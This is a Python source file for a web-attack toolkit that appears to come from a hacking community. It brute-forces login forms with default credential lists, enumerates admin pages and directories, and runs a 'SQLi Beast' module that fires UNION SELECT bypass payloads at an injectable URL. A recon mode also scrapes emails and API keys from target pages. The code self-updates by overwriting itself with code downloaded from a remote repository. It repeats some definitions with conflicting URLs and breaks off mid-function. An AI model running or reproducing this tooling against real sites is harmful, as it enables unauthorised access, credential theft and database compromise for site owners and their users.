import os
import base64
import sys
import requests
import random
import time
import re
import socket
import whois
import dns.resolver
import shodan
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from urllib.parse import urlparse
from colorama import init, Fore, Style

#auto update

# Your current local versions

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
TOOL_VERSION = "3.2"

try:
    with open(os.path.join(SCRIPT_DIR, "wordlist_version_local.txt"),
              "r") as f:
        WORDLIST_VERSION = f.read().strip()
except FileNotFoundError:
    WORDLIST_VERSION = "0.0"  # default if not present

# URLs to check latest versions and download
VERSION_URL = "https://raw.githubusercontent.com/aonexyz/thbd_tools/main/version.txt"
WORDLIST_VERSION_URL = "https://raw.githubusercontent.com/aonexyz/wordlists/refs/heads/main/wordlist_version.txt"
TOOL_UPDATE_URL = "https://raw.githubusercontent.com/aonexyz/thbd_tools/main/thbd_tools.py"

# Wordlist URLs and paths
DEFAULT_WORDLIST_PATH = os.path.join(SCRIPT_DIR, "admin-finder.txt")
WORDLIST_DOWNLOAD_URL = "https://raw.githubusercontent.com/aonexyz/wordlists/refs/heads/main/admin-finder.txt"

DIR_BRUTE_PATH = os.path.join(SCRIPT_DIR, "dir-brute.txt")
DIR_BRUTE_URL = "https://raw.githubusercontent.com/aonexyz/wordlists/refs/heads/main/dir-brute.txt"

DEFAULT_USR_PATH = os.path.join(SCRIPT_DIR, "default_usr.txt")
DEFAULT_PASS_PATH = os.path.join(SCRIPT_DIR, "default_pass.txt")
DEFAULT_USR_URL = "https://raw.githubusercontent.com/aonexyz/wordlists/refs/heads/main/default_usr.txt"
DEFAULT_PASS_URL = "https://raw.githubusercontent.com/aonexyz/wordlists/refs/heads/main/default_pass.txt"


def download_file(url, filepath):
    try:
        print(Fore.YELLOW + f"[*] Downloading: {url}" + Style.RESET_ALL)
        r = requests.get(url, timeout=20)
        r.raise_for_status()
        with open(filepath, "wb") as f:
            f.write(r.content)
        print(Fore.GREEN + f"[✓] Downloaded to {filepath}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[✗] Download failed: {e}" + Style.RESET_ALL)


def update_tool():
    print(Fore.MAGENTA + "[⬆️] Updating tool..." + Style.RESET_ALL)
    try:
        r = requests.get(TOOL_UPDATE_URL, timeout=20)
        r.raise_for_status()
        with open(__file__, "wb") as f:
            f.write(r.content)
        print(Fore.GREEN + "[✓] Tool updated. Restart to apply changes." +
              Style.RESET_ALL)
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"[✗] Tool update failed: {e}" + Style.RESET_ALL)


def update_wordlists():
    print(Fore.MAGENTA + "[⬆️] Updating wordlists..." + Style.RESET_ALL)
    try:
        download_file(WORDLIST_DOWNLOAD_URL, DEFAULT_WORDLIST_PATH)
        download_file(DIR_BRUTE_URL, DIR_BRUTE_PATH)
        download_file(DEFAULT_USR_URL, DEFAULT_USR_PATH)
        download_file(DEFAULT_PASS_URL, DEFAULT_PASS_PATH)
        print(Fore.GREEN + "[✓] Wordlists updated successfully." +
              Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[✗] Wordlist update failed: {e}" + Style.RESET_ALL)


def auto_check_update():
    print(Fore.CYAN + "[*] Checking for updates..." + Style.RESET_ALL)

    # Check tool version
    try:
        r = requests.get(VERSION_URL, timeout=10)
        r.raise_for_status()
        latest_tool_version = r.text.strip()
        if latest_tool_version != TOOL_VERSION:
            print(
                Fore.YELLOW +
                f"[!] New tool version available: {latest_tool_version} (Current: {TOOL_VERSION})"
                + Style.RESET_ALL)
            update_tool()
            return
        else:
            print(Fore.GREEN + "[✓] Tool is up to date." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[✗] Tool version check failed: {e}" +
              Style.RESET_ALL)

    # Check wordlist version
    try:
        r = requests.get(WORDLIST_VERSION_URL, timeout=10)
        r.raise_for_status()
        latest_wordlist_version = r.text.strip()

        global WORDLIST_VERSION
        if latest_wordlist_version != WORDLIST_VERSION:
            print(
                Fore.YELLOW +
                f"[!] Wordlist update available: {latest_wordlist_version} (Current: {WORDLIST_VERSION})"
                + Style.RESET_ALL)
            update_wordlists()

            # Save new version locally
            with open(os.path.join(SCRIPT_DIR, "wordlist_version_local.txt"),
                      "w") as f:
                f.write(latest_wordlist_version)

            WORDLIST_VERSION = latest_wordlist_version
        else:
            print(Fore.GREEN + "[✓] Wordlists are up to date." +
                  Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[✗] Wordlist version check failed: {e}" +
              Style.RESET_ALL)


# Initialize colorama for colorful terminal output
init(autoreset=True)

# =========================
# === CONFIG & CONSTANTS ===
# =========================

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

# Wordlists URLs & paths for admin finder and dir brute force
DEFAULT_WORDLIST_FILENAME = "admin-finder.txt"
DEFAULT_WORDLIST_PATH = os.path.join(SCRIPT_DIR, DEFAULT_WORDLIST_FILENAME)
WORDLIST_DOWNLOAD_URL = (
    "https://raw.githubusercontent.com/mrzico69/wordlists/refs/heads/main/admin-finder.txt"
)

DIR_BRUTE_FILENAME = "dir-brute.txt"
DIR_BRUTE_PATH = os.path.join(SCRIPT_DIR, DIR_BRUTE_FILENAME)
DIR_BRUTE_URL = (
    "https://raw.githubusercontent.com/mrzico69/wordlists/refs/heads/main/dir-brute.txt")

# Default login brute force username/password lists
DEFAULT_USR_FILENAME = "default_usr.txt"
DEFAULT_PASS_FILENAME = "default_pass.txt"
DEFAULT_USR_PATH = os.path.join(SCRIPT_DIR, DEFAULT_USR_FILENAME)
DEFAULT_PASS_PATH = os.path.join(SCRIPT_DIR, DEFAULT_PASS_FILENAME)

DEFAULT_USR_URL = "https://raw.githubusercontent.com/mrzico69/wordlists/refs/heads/main/default_usr.txt"
DEFAULT_PASS_URL = "https://raw.githubusercontent.com/mrzico69/wordlists/refs/heads/main/default_pass.txt"

# Update URL for the tool itself
TOOL_UPDATE_URL = (
    "https://raw.githubusercontent.com/mrzico69/thbd_tools/main/thbd_tools.py")

# User agents list for randomizing requests (for WAF & login brute force)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/115.0",
]

# Common CMS fingerprint patterns (headers, meta tags, HTML markers)
CMS_PATTERNS = {
    "WordPress": ["wp-content", "wp-includes", "xmlrpc.php", "wp-json"],
    "Joomla": ['content="Joomla!', "com_content", "index.php?option="],
    "Drupal": ["sites/default/files", "drupal.js", "drupal-settings-json"],
    "Laravel": ["laravel_session", "XSRF-TOKEN", "csrf-token"],
}

# Common WAF signatures (in status codes and response content)
WAF_SIGNATURES = {
    "Cloudflare": ["cloudflare", "cf-ray", "cf-cache-status"],
    "Sucuri": ["sucuri/cloudproxy", "Sucuri/Cloudproxy"],
    "Imperva": ["Incapsula", "Imperva"],
    "Akamai": ["AkamaiGHost", "Akamai"],
}

# ====================
# === UTILITIES ======
# ====================


def download_file(url, filepath):
    """Download a file from URL and save locally."""
    try:
        print(Fore.YELLOW + f"[*] Downloading: {url}" + Style.RESET_ALL)
        response = requests.get(url, timeout=20)
        response.raise_for_status()
        with open(filepath, "wb") as file:
            file.write(response.content)
        print(Fore.GREEN + f"[✓] Downloaded and saved to {filepath}" +
              Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[✗] Download failed: {e}" + Style.RESET_ALL)


def ensure_wordlists():
    """Ensure default wordlists are present, download if missing."""
    if not os.path.exists(DEFAULT_WORDLIST_PATH):
        print(Fore.YELLOW +
              "[*] Admin finder wordlist missing, downloading..." +
              Style.RESET_ALL)
        download_file(WORDLIST_DOWNLOAD_URL, DEFAULT_WORDLIST_PATH)
    else:
        print(Fore.GREEN + "[✓] Admin finder wordlist found." +
              Style.RESET_ALL)

    if not os.path.exists(DIR_BRUTE_PATH):
        print(Fore.YELLOW +
              "[*] Dir brute force wordlist missing, downloading..." +
              Style.RESET_ALL)
        download_file(DIR_BRUTE_URL, DIR_BRUTE_PATH)
    else:
        print(Fore.GREEN + "[✓] Dir brute force wordlist found." +
              Style.RESET_ALL)


def ensure_login_wordlists():
    """Ensure default login brute force username and password lists are present."""
    if not os.path.exists(DEFAULT_USR_PATH):
        print(Fore.YELLOW +
              "[*] Default username list missing, downloading..." +
              Style.RESET_ALL)
        download_file(DEFAULT_USR_URL, DEFAULT_USR_PATH)
    else:
        print(Fore.GREEN + "[✓] Default username list found." +
              Style.RESET_ALL)

    if not os.path.exists(DEFAULT_PASS_PATH):
        print(Fore.YELLOW +
              "[*] Default password list missing, downloading..." +
              Style.RESET_ALL)
        download_file(DEFAULT_PASS_URL, DEFAULT_PASS_PATH)
    else:
        print(Fore.GREEN + "[✓] Default password list found." +
              Style.RESET_ALL)


def get_random_user_agent():
    """Return a random User-Agent string from the list."""
    return random.choice(USER_AGENTS)


def print_banner():
    """Show tool banner."""
    banner = r"""
█████████╗██╗  ██╗██████╗ ██████╗ 
╚══██╔══╝██║  ██║██╔══██╗██╔══██╗
   ██║   ███████║██████╔╝██║  ██║
   ██║   ██╔══██║██╔══██╗██║  ██║
   ██║   ██║  ██║██████╔╝██████╔╝
   ╚═╝   ╚═╝  ╚═╝╚═════╝ ╚═════╝  
"""
    print(Fore.CYAN + Style.BRIGHT + banner + Fore.YELLOW +
          "        TOOLS by THBD Community ⚡\n" + Style.RESET_ALL)


def show_signature():
    msg = base64.b64decode(
        "44KkIERldmVsb3BlZCBieSBNclo2OSAodGhiZCB0b29scyk=").decode()
    print(msg)


# =====================
# === FEATURE 1: CMS Detector ===
# =====================


def cms_detector(url):
    """
    Detect CMS by checking common CMS patterns in HTML and headers.
    """
    print(Fore.MAGENTA + f"\n[🔍] Running CMS Detector on {url}\n" +
          Style.RESET_ALL)
    if not url.startswith("http"):
        url = "http://" + url

    try:
        headers = {"User-Agent": get_random_user_agent()}
        response = requests.get(url, headers=headers, timeout=10)
        content = response.text.lower()
        detected = []

        # Check headers for clues
        for cms_name, patterns in CMS_PATTERNS.items():
            for pattern in patterns:
                if (pattern.lower() in content
                        or pattern.lower() in str(response.headers).lower()):
                    detected.append(cms_name)
                    break  # If one pattern found, no need to check others for this CMS

        if detected:
            print(Fore.GREEN +
                  f"[✓] Possible CMS detected: {', '.join(set(detected))}" +
                  Style.RESET_ALL)
        else:
            print(Fore.YELLOW +
                  "[!] No CMS detected or CMS is custom/unknown." +
                  Style.RESET_ALL)

    except Exception as e:
        print(Fore.RED + f"[✗] Error while detecting CMS: {e}" +
              Style.RESET_ALL)


# ===============================
# === FEATURE 2: Wayback URL Extractor ===
# ===============================


def wayback_url_extractor(domain):
    """
    Extract archived URLs for a domain from web.archive.org
    """
    print(Fore.MAGENTA +
          f"\n[🌐] Extracting URLs from Wayback Machine for {domain}\n" +
          Style.RESET_ALL)
    if "http" in domain:
        domain = urlparse(domain).netloc

    api_url = f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&fl=original&collapse=urlkey"
    try:
        response = requests.get(api_url, timeout=15)
        response.raise_for_status()
        urls = response.json()
        if len(urls) < 2:
            print(Fore.YELLOW + "[!] No archived URLs found." +
                  Style.RESET_ALL)
            return

        print(Fore.GREEN + f"[✓] Found {len(urls) - 1} archived URLs:\n" +
              Style.RESET_ALL)
        for u in urls[1:]:  # skip header
            print(u[0])
    except Exception as e:
        print(Fore.RED + f"[✗] Failed to extract Wayback URLs: {e}" +
              Style.RESET_ALL)


# =====================
# === FEATURE 3: WAF Detector ===
# =====================


def waf_detector(url):
    """
    Detect WAF by checking response headers and content for known WAF signatures.
    """
    print(Fore.MAGENTA + f"\n[🛡️] Running WAF Detector on {url}\n" +
          Style.RESET_ALL)
    if not url.startswith("http"):
        url = "http://" + url

    headers = {"User-Agent": get_random_user_agent()}

    try:
        response = requests.get(url, headers=headers, timeout=10)
        content_lower = response.text.lower()
        headers_lower = str(response.headers).lower()
        detected_wafs = []

        for waf_name, signatures in WAF_SIGNATURES.items():
            for sig in signatures:
                if sig.lower() in content_lower or sig.lower(
                ) in headers_lower:
                    detected_wafs.append(waf_name)
                    break

        if detected_wafs:
            print(Fore.GREEN +
                  f"[✓] WAF detected: {', '.join(set(detected_wafs))}" +
                  Style.RESET_ALL)
        else:
            print(Fore.YELLOW + "[!] No WAF detected or unknown WAF." +
                  Style.RESET_ALL)

    except Exception as e:
        print(Fore.RED + f"[✗] WAF detection failed: {e}" + Style.RESET_ALL)


# =========================
# === FEATURE 4: Login Page Brute Force ===
# =========================


def login_bruteforce():
    """
    Brute force login page using username and password wordlists.
    Supports default (auto download) and custom user/pass lists.
    """
    print(Fore.MAGENTA + "\n[🔐] Login Page Brute Force\n" + Style.RESET_ALL)
    login_url = input("Enter login form URL: ").strip()
    username_field = input("Enter the username form field name: ").strip()
    password_field = input("Enter the password form field name: ").strip()
    success_indicator = input(
        "Enter a keyword/text that appears on login success page (e.g. 'dashboard'): "
    ).strip()

    # Choose default or custom wordlists
    while True:
        print("\nChoose Wordlist Option:")
        print("1. Use Default Wordlists (auto-download if missing)")
        print("2. Use Custom Wordlists")
        choice = input("Your choice: ").strip()

        if choice == "1":
            ensure_login_wordlists()
            if not (os.path.exists(DEFAULT_USR_PATH)
                    and os.path.exists(DEFAULT_PASS_PATH)):
                print(
                    Fore.RED +
                    "❌ Default login wordlists missing or failed to download."
                    + Style.RESET_ALL)
                return
            username_list_path = DEFAULT_USR_PATH
            password_list_path = DEFAULT_PASS_PATH
            break
        elif choice == "2":
            username_list_path = input(
                "Enter path to username list file: ").strip()
            password_list_path = input(
                "Enter path to password list file: ").strip()
            if not os.path.exists(username_list_path):
                print(Fore.RED + "❌ Username list file not found." +
                      Style.RESET_ALL)
                continue
            if not os.path.exists(password_list_path):
                print(Fore.RED + "❌ Password list file not found." +
                      Style.RESET_ALL)
                continue
            break
        else:
            print(Fore.RED + "❌ Invalid option. Please choose 1 or 2." +
                  Style.RESET_ALL)

    # Load username and password lists
    with open(username_list_path, "r") as f:
        usernames = [line.strip() for line in f if line.strip()]

    with open(password_list_path, "r") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(Fore.YELLOW + f"[*] Starting brute force on {login_url}..." +
          Style.RESET_ALL)

    session = requests.Session()

    for username in usernames:
        for password in passwords:
            headers = {"User-Agent": get_random_user_agent()}
            data = {username_field: username, password_field: password}

            try:
                response = session.post(login_url,
                                        data=data,
                                        headers=headers,
                                        timeout=10)
                if success_indicator.lower() in response.text.lower():
                    print(Fore.GREEN +
                          f"[✓] Login successful with {username}:{password}" +
                          Style.RESET_ALL)
                    return
                else:
                    print(Fore.BLUE +
                          f"Trying {username}:{password} - Failed" +
                          Style.RESET_ALL)
                time.sleep(0.5)
            except Exception as e:
                print(Fore.RED + f"[✗] Request error: {e}" + Style.RESET_ALL)
                return

    print(Fore.YELLOW +
          "[!] Brute force completed. No valid credentials found." +
          Style.RESET_ALL)


# =====================
# === FEATURE 5: Admin Finder ===
# =====================


def admin_finder_menu():
    print(Fore.MAGENTA + "\n[🕵️] Admin Page Finder\n" + Style.RESET_ALL)
    target = input("Enter target URL (e.g. example.com): ").strip()
    if not target.startswith("http"):
        target = "http://" + target

    ensure_wordlists()

    try:
        with open(DEFAULT_WORDLIST_PATH, "r") as file:
            paths = [line.strip() for line in file if line.strip()]
    except Exception as e:
        print(Fore.RED + f"[✗] Could not load admin finder wordlist: {e}" +
              Style.RESET_ALL)
        return

    print(Fore.YELLOW + f"[*] Starting Admin Finder on {target}..." +
          Style.RESET_ALL)

    headers = {"User-Agent": get_random_user_agent()}

    found = []

    for path in paths:
        url = target.rstrip("/") + "/" + path.lstrip("/")
        try:
            response = requests.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                print(Fore.GREEN + f"[✓] Found admin page: {url}" +
                      Style.RESET_ALL)
                found.append(url)
            else:
                print(Fore.BLUE + f"[-] Not found: {url}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[✗] Request error: {e}" + Style.RESET_ALL)

    if not found:
        print(Fore.YELLOW + "[!] No admin pages found." + Style.RESET_ALL)
    else:
        print(Fore.GREEN + f"[✓] Total admin pages found: {len(found)}" +
              Style.RESET_ALL)


# ========================
# === FEATURE 6: Dir Brute Force ===
# ========================


def dir_brute_menu():
    print(Fore.MAGENTA + "\n[🗂️] Directory Brute Force\n" + Style.RESET_ALL)
    target = input("Enter target URL (e.g. example.com): ").strip()
    if not target.startswith("http"):
        target = "http://" + target

    ensure_wordlists()

    try:
        with open(DIR_BRUTE_PATH, "r") as file:
            paths = [line.strip() for line in file if line.strip()]
    except Exception as e:
        print(Fore.RED + f"[✗] Could not load dir brute wordlist: {e}" +
              Style.RESET_ALL)
        return

    print(Fore.YELLOW + f"[*] Starting Directory Brute Force on {target}..." +
          Style.RESET_ALL)

    headers = {"User-Agent": get_random_user_agent()}

    found = []

    for path in paths:
        url = target.rstrip("/") + "/" + path.lstrip("/")
        try:
            response = requests.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                print(Fore.GREEN + f"[✓] Found directory/page: {url}" +
                      Style.RESET_ALL)
                found.append(url)
            else:
                print(Fore.BLUE + f"[-] Not found: {url}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[✗] Request error: {e}" + Style.RESET_ALL)

    if not found:
        print(Fore.YELLOW + "[!] No directories or pages found." +
              Style.RESET_ALL)
    else:
        print(Fore.GREEN + f"[✓] Total directories/pages found: {len(found)}" +
              Style.RESET_ALL)


# ========================
# === FEATURE 7: Combo Attack (Admin + Dir Brute) ===
# ========================


def combo_attack():
    print(Fore.MAGENTA +
          "\n[⚔️] Combo Attack (Admin Finder + Dir Brute Force)\n" +
          Style.RESET_ALL)
    target = input("Enter target URL (e.g. example.com): ").strip()
    if not target.startswith("http"):
        target = "http://" + target

    ensure_wordlists()

    # Load both wordlists
    try:
        with open(DEFAULT_WORDLIST_PATH, "r") as file:
            admin_paths = [line.strip() for line in file if line.strip()]
    except Exception as e:
        print(Fore.RED + f"[✗] Could not load admin finder wordlist: {e}" +
              Style.RESET_ALL)
        return

    try:
        with open(DIR_BRUTE_PATH, "r") as file:
            dir_paths = [line.strip() for line in file if line.strip()]
    except Exception as e:
        print(Fore.RED + f"[✗] Could not load dir brute wordlist: {e}" +
              Style.RESET_ALL)
        return

    print(Fore.YELLOW + f"[*] Starting Combo Attack on {target}..." +
          Style.RESET_ALL)

    headers = {"User-Agent": get_random_user_agent()}

    found = []

    all_paths = admin_paths + dir_paths

    for path in all_paths:
        url = target.rstrip("/") + "/" + path.lstrip("/")
        try:
            response = requests.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                print(Fore.GREEN + f"[✓] Found: {url}" + Style.RESET_ALL)
                found.append(url)
            else:
                print(Fore.BLUE + f"[-] Not found: {url}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[✗] Request error: {e}" + Style.RESET_ALL)

    if not found:
        print(Fore.YELLOW + "[!] No admin pages or directories found." +
              Style.RESET_ALL)
    else:
        print(Fore.GREEN + f"[✓] Total found: {len(found)}" + Style.RESET_ALL)


def download_wordlist(url, filename):
    print(
        f"[+] Wordlist '{filename}' not found locally. Downloading from {url} ..."
    )
    try:
        response = requests.get(url, timeout=20)
        response.raise_for_status()
        with open(filename, "w", encoding="utf-8") as f:
            f.write(response.text)
        print(f"[+] Downloaded and saved '{filename}' successfully.")
        return True
    except Exception as e:
        print(f"[!] Failed to download wordlist: {e}")
        return False


def load_wordlist(file_path):
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            lines = [line.strip() for line in f if line.strip() != ""]
        return lines
    except Exception as e:
        print(f"[!] Error loading wordlist '{file_path}': {e}")
        return []


def download_wordlist(url, filename):
    if os.path.isfile(filename):
        return True
    print(f"[+] Downloading wordlist '{filename}' from {url} ...")
    try:
        r = requests.get(url, timeout=20)
        r.raise_for_status()
        with open(filename, "w", encoding="utf-8") as f:
            f.write(r.text)
        print(f"[+] Wordlist '{filename}' saved.")
        return True
    except Exception as e:
        print(Fore.RED + f"[!] Failed to download {filename}: {e}" +
              Style.RESET_ALL)
        return False


def load_wordlist(filename):
    try:
        with open(filename, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(Fore.RED + f"[!] Could not load wordlist '{filename}': {e}" +
              Style.RESET_ALL)
        return []


def sqli_beast_tool():
    print(Fore.CYAN + "==== THBD SQLi Beast Tool ====" + Style.RESET_ALL)

    target = input(
        "Enter vulnerable URL with injectable param (e.g. http://site.com/page.php?id=): "
    ).strip()
    if not target:
        print(Fore.RED + "[!] Target URL cannot be empty." + Style.RESET_ALL)
        return

    # Wordlists URLs
    union_wordlist_url = "https://raw.githubusercontent.com/mrzico69/wordlists/refs/heads/main/unionselect_bypass_wordlist.txt"
    orderby_wordlist_url = "https://raw.githubusercontent.com/mrzico69/wordlists/refs/heads/main/orderby_wordlist.txt"

    union_wordlist_file = "unionselect_bypass_wordlist.txt"
    orderby_wordlist_file = "orderby_wordlist.txt"

    # Download wordlists if missing
    if not download_wordlist(union_wordlist_url, union_wordlist_file):
        print(Fore.RED + "[!] Cannot proceed without union select wordlist." +
              Style.RESET_ALL)
        return
    if not download_wordlist(orderby_wordlist_url, orderby_wordlist_file):
        print(Fore.RED + "[!] Cannot proceed without orderby wordlist." +
              Style.RESET_ALL)
        return

    union_payloads = load_wordlist(union_wordlist_file)
    orderby_payloads = load_wordlist(orderby_wordlist_file)

    headers = {"User-Agent": "Mozilla/5.0 (compatible; THBD SQLi Beast)"}

    print(Fore.YELLOW + "[*] Starting ORDER BY detection phase..." +
          Style.RESET_ALL)
    max_columns = 50
    detected_columns = 0

    # Detect columns by sending ORDER BY payloads from wordlist or fallback to 1..max
    for col_num in range(1, max_columns + 1):
        payload = f" ORDER BY {col_num}--+"
        test_url = target + payload
        try:
            resp = requests.get(test_url, headers=headers, timeout=15)
            if resp.status_code >= 400:
                detected_columns = col_num - 1
                print(Fore.GREEN +
                      f"[+] Detected max columns: {detected_columns}" +
                      Style.RESET_ALL)
                break
        except Exception as e:
            print(Fore.RED +
                  f"[!] Request error during ORDER BY detection: {e}" +
                  Style.RESET_ALL)
            return

    if detected_columns == 0:
        detected_columns = max_columns
        print(Fore.GREEN + f"[+] Assuming max columns: {detected_columns}" +
              Style.RESET_ALL)

    # Build union select placeholder list for detected columns: '1,2,3,...'
    union_columns = ",".join(str(i) for i in range(1, detected_columns + 1))

    print(Fore.YELLOW + "[*] Starting UNION SELECT payload testing..." +
          Style.RESET_ALL)

    found_payloads = []

    for idx, payload_template in enumerate(union_payloads, start=1):
        # Replace placeholder {union} with our columns
        payload = payload_template.replace("{union}", union_columns)
        test_url = target + payload

        print(
            f"[{idx}/{len(union_payloads)}] Testing payload:\n{Fore.CYAN}{payload}{Style.RESET_ALL}"
        )
        try:
            resp = requests.get(test_url, headers=headers, timeout=15)
            if resp.status_code < 400:
                print(
                    Fore.GREEN +
                    f"[+] Potential bypass detected with HTTP {resp.status_code}"
                    + Style.RESET_ALL)
                found_payloads.append(test_url)
            else:
                print(Fore.RED + f"[-] Blocked with HTTP {resp.status_code}" +
                      Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[!] Request error: {e}" + Style.RESET_ALL)
        time.sleep(0.5)

    if found_payloads:
        print(Fore.CYAN +
              "\n[+] Bypass payloads that returned positive results:" +
              Style.RESET_ALL)
        for p in found_payloads:
            print(p)
        with open("sqli_beast_success.txt", "a", encoding="utf-8") as f:
            for p in found_payloads:
                f.write(p + "\n")
        print(Fore.GREEN +
              "[+] Saved successful payloads to sqli_beast_success.txt" +
              Style.RESET_ALL)
    else:
        print(Fore.RED + "[!] No working payload found." + Style.RESET_ALL)

    print(Fore.CYAN + "[*] SQLi Beast finished." + Style.RESET_ALL)


#RECON


def full_recon_combo_txt():
    print("\n[*] THBD FULL RECON BEAST MODE (TXT REPORT)\n")
    target = input("Enter target domain (example.com): ").strip()
    shodan_api_key = input(
        "Enter your Shodan API key (or Enter to skip): ").strip()
    if not target.startswith("http"):
        url = "http://" + target
    else:
        url = target
        target = target.replace("http://", "").replace("https://", "")

    report = []
    report.append("╔══════════════════════════════════════════════════╗")
    report.append("║               THBD FULL RECON REPORT              ║")
    report.append("╚══════════════════════════════════════════════════╝")
    report.append(f"Target  : {target}")
    report.append(f"Date    : {time.strftime('%Y-%m-%d %H:%M:%S')}")
    report.append("=" * 50)

    # Subdomain scan
    report.append("\n[+] SUBDOMAIN SCAN")
    common_subs = [
        "www", "mail", "ftp", "cpanel", "admin", "blog", "test", "dev", "api",
        "webmail"
    ]
    live_subs = []
    for sub in common_subs:
        test_url = f"http://{sub}.{target}"
        try:
            r = requests.get(test_url, timeout=3)
            if r.status_code < 400:
                live_subs.append(f"{test_url} (Status: {r.status_code})")
        except:
            pass
    if live_subs:
        report.extend(live_subs)
    else:
        report.append("No common subdomains found alive.")

    # HTTP headers
    report.append("\n[+] HTTP HEADERS")
    try:
        r = requests.get(url, timeout=5)
        for k, v in r.headers.items():
            report.append(f"{k}: {v}")
    except:
        report.append("Failed to retrieve HTTP headers.")

    # CMS detection
    report.append("\n[+] CMS DETECTION")
    body = ""
    try:
        body = r.text.lower()
        cms_found = []
        if "wp-content" in body:
            cms_found.append("WordPress")
        if "drupal" in body:
            cms_found.append("Drupal")
        if "joomla" in body:
            cms_found.append("Joomla")
        if cms_found:
            report.append("Detected CMS: " + ", ".join(cms_found))
        else:
            report.append("CMS not detected.")
    except:
        report.append("Failed to detect CMS.")

    # Wayback URLs
    report.append("\n[+] WAYBACK MACHINE SNAPSHOT URLS")
    try:
        wb_url = f"http://web.archive.org/cdx/search/cdx?url=*.{target}&output=text&fl=original&collapse=urlkey"
        res = requests.get(wb_url, timeout=7)
        urls = res.text.splitlines()[:20]
        report.extend(urls if urls else ["No URLs found in Wayback Machine."])
    except:
        report.append("Failed to fetch Wayback URLs.")

    # JS endpoint extraction
    report.append("\n[+] JS ENDPOINT EXTRACTION")
    try:
        soup = BeautifulSoup(r.text, "html.parser")
        js_links = [
            urljoin(url, s['src']) for s in soup.find_all("script")
            if s.get("src")
        ]
        endpoints = set()
        for js in js_links:
            try:
                js_code = requests.get(js, timeout=4).text
                found = re.findall(r"[\"'](\/[a-zA-Z0-9_\-\/\.\?\=\&]+)[\"']",
                                   js_code)
                for ep in found:
                    endpoints.add(ep)
            except:
                pass
        if endpoints:
            report.extend(endpoints)
        else:
            report.append("No JS endpoints found.")
    except:
        report.append("Failed to extract JS endpoints.")

    # Emails and API keys
    report.append("\n[+] EMAILS & API KEYS FOUND")
    try:
        emails = re.findall(r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+",
                            body)
        keys = re.findall(
            r"(?:API|api|key|KEY)[\"']?\s*[:=]\s*[\"']?[A-Za-z0-9_\-]{16,45}",
            body)
        if emails:
            report.extend(set(emails))
        if keys:
            for k in set(keys):
                report.append(f"Possible API key: {k}")
        if not emails and not keys:
            report.append("No emails or keys found.")
    except:
        report.append("Failed to find emails or API keys.")

    # robots.txt & sitemap.xml
    report.append("\n[+] ROBOTS.TXT & SITEMAP.XML")
    for path in ["/robots.txt", "/sitemap.xml"]:
        try:
            resp = requests.get(url + path, timeout=4)
            if resp.status_code == 200:
                report.append(f"{path} found (first 10 lines):")
                lines = resp.text.splitlines()[:10]
                report.extend(lines)
            else:
                report.append(f"{path} not found.")
        except:
            report.append(f"Error fetching {path}.")

    # IP info
    report.append("\n[+] IP RESOLUTION")
    try:
        ip = socket.gethostbyname(target)
        report.append(f"{target} resolved to {ip}")
    except:
        report.append("Failed to resolve IP.")

    # WHOIS lookup
    report.append("\n[+] WHOIS LOOKUP")
    try:
        w = whois.whois(target)
        reg = w.get('registrant_name') or w.get('name') or "N/A"
        org = w.get('org') or "N/A"
        country = w.get('country') or "N/A"
        cd = w.get('creation_date')
        ed = w.get('expiration_date')
        if isinstance(cd, list): cd = cd[0]
        if isinstance(ed, list): ed = ed[0]
        report.append(f"Registrant Name : {reg}")
        report.append(f"Organization    : {org}")
        report.append(f"Country         : {country}")
        report.append(f"Creation Date   : {cd}")
        report.append(f"Expiration Date : {ed}")
    except Exception as e:
        report.append(f"WHOIS lookup failed: {e}")

    # DNS records
    report.append("\n[+] DNS RECORDS")
    try:
        resolver = dns.resolver.Resolver()
        for rec_type in ['A', 'MX', 'NS', 'TXT']:
            try:
                answers = resolver.resolve(target, rec_type)
                report.append(f"{rec_type} Records:")
                for rdata in answers:
                    report.append(f" - {rdata.to_text()}")
            except:
                report.append(f"No {rec_type} records found.")
    except Exception as e:
        report.append(f"DNS lookup failed: {e}")

    # WhatWeb basic fingerprint
    report.append("\n[+] WHATWEB TECH FINGERPRINT")
    try:
        techs = []
        headers = r.headers
        b = r.text.lower()
        if 'server' in headers:
            techs.append(f"Server: {headers['server']}")
        if 'x-powered-by' in headers:
            techs.append(f"X-Powered-By: {headers['x-powered-by']}")
        if 'wp-content' in b:
            techs.append("WordPress detected")
        if 'drupal' in b:
            techs.append("Drupal detected")
        if 'joomla' in b:
            techs.append("Joomla detected")
        if not techs:
            techs.append("No fingerprintable tech detected")
        report.extend(techs)
    except:
        report.append("Failed WhatWeb scan.")

    # Shodan port scan
    report.append("\n[+] SHODAN PORT SCAN")
    if shodan_api_key:
        try:
            api = shodan.Shodan(shodan_api_key)
